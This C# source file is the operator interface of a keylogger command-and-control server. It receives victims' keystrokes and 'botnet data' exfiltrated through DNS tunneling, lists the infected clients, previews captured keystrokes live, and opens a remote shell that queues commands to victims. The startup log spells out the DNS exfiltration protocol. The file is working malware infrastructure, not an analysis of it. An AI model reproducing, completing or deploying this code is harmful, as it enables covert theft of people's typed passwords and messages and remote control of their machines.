using System.Net;
using Server.Logic;
using Server.Models;

namespace Server.UI
{
    public partial class KeyLoggerForm : Form
    {
        private ServerLogic? _serverLogic;
        public bool _isRunning = false;
        private Dictionary<int, RemoteShellForm> _shellForms = new();


        private TextBox txtDomain = null!;
        private TextBox txtPort = null!;
        private TextBox txtLogPath = null!;
        private TextBox txtServerIp = null!;
        private Button btnStartStop = null!;
        private RichTextBox txtLog = null!;
        private ListView lvClients = null!;
        private Label lblStatus = null!;
        private Label lblConnections = null!;
        private RichTextBox txtKeystrokePreview = null!;

        public KeyLoggerForm()
        {
            InitializeComponent();
            InitializeCustomComponents();
            InitializeServerLogic();
        }

        private void InitializeServerLogic()
        {
            _serverLogic = new ServerLogic();
            _serverLogic.OnLogMessage += LogMessage;
            _serverLogic.OnClientAdded += AddClientToList;
            _serverLogic.OnClientCountChanged += UpdateClientCount;
            _serverLogic.OnDataReceived += OnKeystrokeReceived;
            _serverLogic.OnCommandResult += OnCommandResultReceived;
        }

        private void InitializeCustomComponents()
        {
            this.Text = "DNS Tunneling Keylogger Server - Authoritative DNS";
            this.Size = new Size(1200, 800);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormClosing += MainForm_FormClosing;

            // Panel tren - Cau hinh server
            Panel configPanel = new Panel
            {
                Dock = DockStyle.Top,
                Height = 150,
                BackColor = Color.FromArgb(240, 240, 240),
                Padding = new Padding(10)
            };

            Label lblTitle = new Label
            {
                Text = "🔐 DNS Tunneling C&C Server (Tailscale + Bind9)",
                Font = new Font("Segoe UI", 14, FontStyle.Bold),
                Location = new Point(10, 10),
                AutoSize = true,
                ForeColor = Color.FromArgb(0, 120, 215)
            };


            Label lblDomain = new Label { Text = "Domain:", Location = new Point(10, 45), AutoSize = true };
            txtDomain = new TextBox
            {
                Location = new Point(90, 43),
                Width = 200,
                Text = "example.com"
            };

            Label lblPort = new Label { Text = "Port:", Location = new Point(310, 45), AutoSize = true };
            txtPort = new TextBox
            {
                Location = new Point(350, 43),
                Width = 80,
                Text = "53"
            };

            Label lblServerIpLabel = new Label { Text = "C&C IP:", Location = new Point(450, 45), AutoSize = true };
            txtServerIp = new TextBox
            {
                Location = new Point(520, 43),
                Width = 150,
                Text = "100.123.123.123"  // C&C Server IP on Tailscale network
            };
            
            // Helper label
            Label lblHelp = new Label 
            { 
                Text = "Note: Clients query DNS Resolver (100.111.111.100), which forwards to this C&C",
                Location = new Point(690, 45), 
                AutoSize = true,
                ForeColor = Color.Gray,
                Font = new Font("Segoe UI", 8)
            };


            Label lblLogPathLabel = new Label { Text = "Logs:", Location = new Point(10, 75), AutoSize = true };
            txtLogPath = new TextBox
            {
                Location = new Point(90, 73),
                Width = 200,
                Text = "./logs"
            };

            btnStartStop = new Button
            {
                Text = "▶ START SERVER",
                Location = new Point(310, 70),
                Size = new Size(150, 30),
                BackColor = Color.FromArgb(0, 120, 215),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat,
                Font = new Font("Segoe UI", 9, FontStyle.Bold)
            };
            btnStartStop.Click += BtnStartStop_Click;

            lblStatus = new Label
            {
                Text = "⚫ Stopped",
                Location = new Point(10, 115),
                AutoSize = true,
                Font = new Font("Segoe UI", 10, FontStyle.Bold),
                ForeColor = Color.Gray
            };

            lblConnections = new Label
            {
                Text = "Connections: 0",
                Location = new Point(150, 115),
                AutoSize = true,
                Font = new Font("Segoe UI", 10)
            };

            configPanel.Controls.AddRange(new Control[] {
                lblTitle, lblDomain, txtDomain, lblPort, txtPort,
                lblServerIpLabel, txtServerIp, lblHelp, lblLogPathLabel, txtLogPath, 
                btnStartStop, lblStatus, lblConnections
            });

            // Phan chia giua - Split Container
            SplitContainer splitContainer = new SplitContainer
            {
                Dock = DockStyle.Fill,
                Orientation = Orientation.Horizontal,
                SplitterDistance = 350
            };

            // Phan tren split - Danh sach clients
            GroupBox grpClients = new GroupBox
            {
                Text = "Connected Clients",
                Dock = DockStyle.Fill,
                Padding = new Padding(10)
            };

            lvClients = new ListView
            {
                Dock = DockStyle.Fill,
                View = View.Details,
                FullRowSelect = true,
                GridLines = true
            };
            lvClients.Columns.Add("ID", 50);
            lvClients.Columns.Add("IP Address", 150);
            lvClients.Columns.Add("Connected At", 150);
            lvClients.Columns.Add("Packets", 80);
            lvClients.Columns.Add("Data Size", 100);
            
            // Them context menu cho right-click
            ContextMenuStrip contextMenu = new ContextMenuStrip();
            ToolStripMenuItem menuRemoteShell = new ToolStripMenuItem("🖥️ Open Remote Shell");
            menuRemoteShell.Click += MenuRemoteShell_Click;
            contextMenu.Items.Add(menuRemoteShell);
            lvClients.ContextMenuStrip = contextMenu;

            grpClients.Controls.Add(lvClients);
            splitContainer.Panel1.Controls.Add(grpClients);

            // Phan duoi split - Tabs cho Logs va Keystrokes
            TabControl tabControl = new TabControl
            {
                Dock = DockStyle.Fill
            };

            // Tab 1: Server Log
            TabPage tabLog = new TabPage("Server Log");
            txtLog = new RichTextBox
            {
                Dock = DockStyle.Fill,
                BackColor = Color.Black,
                ForeColor = Color.Lime,
                Font = new Font("Consolas", 9),
                ReadOnly = true
            };
            tabLog.Controls.Add(txtLog);

            // Tab 2: Keystroke Preview
            TabPage tabKeystrokes = new TabPage("Keystroke Preview");
            txtKeystrokePreview = new RichTextBox
            {
                Dock = DockStyle.Fill,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.White,
                Font = new Font("Consolas", 11),
                ReadOnly = true
            };
            tabKeystrokes.Controls.Add(txtKeystrokePreview);

            tabControl.TabPages.Add(tabLog);
            tabControl.TabPages.Add(tabKeystrokes);

            splitContainer.Panel2.Controls.Add(tabControl);

            // Add all to form
            this.Controls.Add(splitContainer);
            this.Controls.Add(configPanel);

            // Initial log
            LogMessage("=".PadRight(60, '='));
            LogMessage(" DNS TUNNELING C&C SERVER (TAILSCALE + BIND9)");
            LogMessage("=".PadRight(60, '='));
            LogMessage("Architecture:");
            LogMessage("  [Client 100.x.x.x] -> [DNS Resolver 100.111.111.100]");
            LogMessage("                         -> [C&C Server 100.123.123.123]");
            LogMessage("Protocol:");
            LogMessage("  Connection:  a.1.1.1.domain → Returns x.x.x.[ConnID]");
            LogMessage("  Keylogger:   b.[Pkt].[ID].[HexData].domain → Returns [Code].x.x.x");
            LogMessage("  BotnetData:  c.[Pkt].[Off].[ID].[HexData].domain → Returns [Code].x.x.x");
            LogMessage("  PollCommand: p.[Pkt].[Off].[ID].domain → Returns TXT(HexCommand)");
            LogMessage("=".PadRight(60, '='));
        }

        private void BtnStartStop_Click(object? sender, EventArgs e)
        {
            if (!_isRunning)
            {
                StartServer();
            }
            else
            {
               DialogResult result = MessageBox.Show("REMOVE?", "Xác nhận", MessageBoxButtons.OKCancel, MessageBoxIcon.Question);
               if (result == DialogResult.OK)
               {
                   StopServer();
               }
               else
               {
                   return;
               }
            }
        }

        private void StartServer()
        {
            try
            {
                int port = int.Parse(txtPort.Text);
                string domain = txtDomain.Text.Trim();
                string logPath = txtLogPath.Text.Trim();
                string serverIp = txtServerIp.Text.Trim();

                if (string.IsNullOrEmpty(domain))
                {
                    MessageBox.Show("Please enter a domain name", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }


                if (!System.Net.IPAddress.TryParse(serverIp, out _))
                {
                    MessageBox.Show("Please enter a valid IP address", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }


                if (port <= 1024)
                {
                    MessageBox.Show(
                        "Port 53 requires Administrator privileges!\n\n" +
                        "Please run this application as Administrator.",
                        "Administrator Required",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning
                    );
                }

                _serverLogic?.Start(port, domain, logPath, serverIp);
                _isRunning = true;


                btnStartStop.Text = "⏹ STOP SERVER";
                btnStartStop.BackColor = Color.FromArgb(192, 0, 0);
                lblStatus.Text = "🟢 Running";
                lblStatus.ForeColor = Color.Green;
                txtDomain.Enabled = false;
                txtPort.Enabled = false;
                txtLogPath.Enabled = false;
                txtServerIp.Enabled = false;

                LogMessage("\n>>> Authoritative DNS Server is LIVE <<<");
                LogMessage(">>> Clients should query DNS Resolver (100.111.111.100) <<<");
                LogMessage(">>> DNS Resolver forwards to this C&C (" + serverIp + ") <<<\n");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to start server:\n{ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                LogMessage($"[ERROR] {ex.Message}");
            }
        }

        private void StopServer()
        {
            // Disable button to prevent double-click
            btnStartStop.Enabled = false;
            btnStartStop.Text = "⏳ STOPPING...";
            lblStatus.Text = "🟡 Shutting down...";
            lblStatus.ForeColor = Color.Orange;
            
            // Run stop logic on background thread to avoid blocking UI
            Task.Run(() =>
            {
                _serverLogic?.Stop();
                
                // Update UI on main thread after stop completes
                this.Invoke(() =>
                {
                    _isRunning = false;
                    btnStartStop.Text = "▶ START SERVER";
                    btnStartStop.BackColor = Color.FromArgb(0, 120, 215);
                    btnStartStop.Enabled = true;
                    lblStatus.Text = "⚫ Stopped";
                    lblStatus.ForeColor = Color.Gray;
                    txtDomain.Enabled = true;
                    txtPort.Enabled = true;
                    txtLogPath.Enabled = true;
                    txtServerIp.Enabled = true;
                });
            });
        }

        private void LogMessage(string message)
        {
            if (txtLog.InvokeRequired)
            {
                txtLog.Invoke(() => LogMessage(message));
                return;
            }

            txtLog.AppendText(message + "\n");
            txtLog.ScrollToCaret();
        }

        private void AddClientToList(ClientInfo client)
        {
            if (lvClients.InvokeRequired)
            {
                lvClients.Invoke(() => AddClientToList(client));
                return;
            }

            var item = new ListViewItem(client.ConnectionId.ToString());
            item.SubItems.Add(client.IpAddress);
            item.SubItems.Add(client.ConnectedAt.ToString("HH:mm:ss"));
            item.SubItems.Add(client.PacketsReceived.ToString());
            item.SubItems.Add("0");  
            item.Tag = client.ConnectionId;

            lvClients.Items.Add(item);
        }

        private void UpdateClientCount(int count)
        {
            if (lblConnections.InvokeRequired)
            {
                lblConnections.Invoke(() => UpdateClientCount(count));
                return;
            }

            lblConnections.Text = $"Connections: {count}";
        }

        private void OnKeystrokeReceived(int connectionId, string data)
        {
            if (txtKeystrokePreview.InvokeRequired)
            {
                txtKeystrokePreview.Invoke(() => OnKeystrokeReceived(connectionId, data));
                return;
            }

            txtKeystrokePreview.SelectionColor = Color.Yellow;
            txtKeystrokePreview.AppendText($"[Conn #{connectionId}] ");
            txtKeystrokePreview.SelectionColor = Color.White;
            txtKeystrokePreview.AppendText(data);
            txtKeystrokePreview.ScrollToCaret();

            // Update client statistics in ListView
            foreach (ListViewItem item in lvClients.Items)
            {
                if (item.Tag != null && (int)item.Tag == connectionId)
                {
                    // Update packets count
                    int packets = int.Parse(item.SubItems[3].Text) + 1;
                    item.SubItems[3].Text = packets.ToString();
                    
                    // Update data size (bytes)
                    int currentSize = int.Parse(item.SubItems[4].Text);
                    int newSize = currentSize + data.Length;
                    item.SubItems[4].Text = newSize.ToString();
                    break;
                }
            }
        }

        private void MenuRemoteShell_Click(object? sender, EventArgs e)
        {
            if (lvClients.SelectedItems.Count == 0)
            {
                MessageBox.Show("Please select a client first.", "No Selection", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            var selectedItem = lvClients.SelectedItems[0];
            if (selectedItem.Tag == null)
            {
                MessageBox.Show("Invalid client selection.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            
            int connectionId = (int)selectedItem.Tag;
            string clientIp = selectedItem.SubItems[1].Text;


            if (_shellForms.ContainsKey(connectionId) && !_shellForms[connectionId].IsDisposed)
            {
                _shellForms[connectionId].Focus();
                return;
            }


            var shellForm = new RemoteShellForm(connectionId, clientIp, SendCommandToClient);
            shellForm.FormClosed += (s, args) => _shellForms.Remove(connectionId);
            _shellForms[connectionId] = shellForm;
            shellForm.Show();

            LogMessage($"[Shell] Opened remote shell for connection #{connectionId}");
        }

        private void SendCommandToClient(int connectionId, string command)
        {
            if (_serverLogic != null)
            {
                _serverLogic.EnqueueCommand(connectionId, command);
                LogMessage($"[Command] Sent to connection #{connectionId}: '{command}'");
            }
        }

        private void OnCommandResultReceived(int connectionId, string result)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(() => OnCommandResultReceived(connectionId, result));
                return;
            }


            if (_shellForms.ContainsKey(connectionId) && !_shellForms[connectionId].IsDisposed)
            {
                _shellForms[connectionId].AppendOutput(result);
            }

            LogMessage($"[Result] From connection #{connectionId}: {result.Length} bytes");
        }

        private void MainForm_FormClosing(object? sender, FormClosingEventArgs e)
        {
            if (_isRunning)
            {
                var result = MessageBox.Show(
                    "Server is still running. Stop and exit?",
                    "Confirm Exit",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question
                );

                if (result == DialogResult.Yes)
                {
                    StopServer();
                }
                else
                {
                    e.Cancel = true;
                }
            }


            foreach (var form in _shellForms.Values)
            {
                if (!form.IsDisposed)
                    form.Close();
            }
        }
    }
}
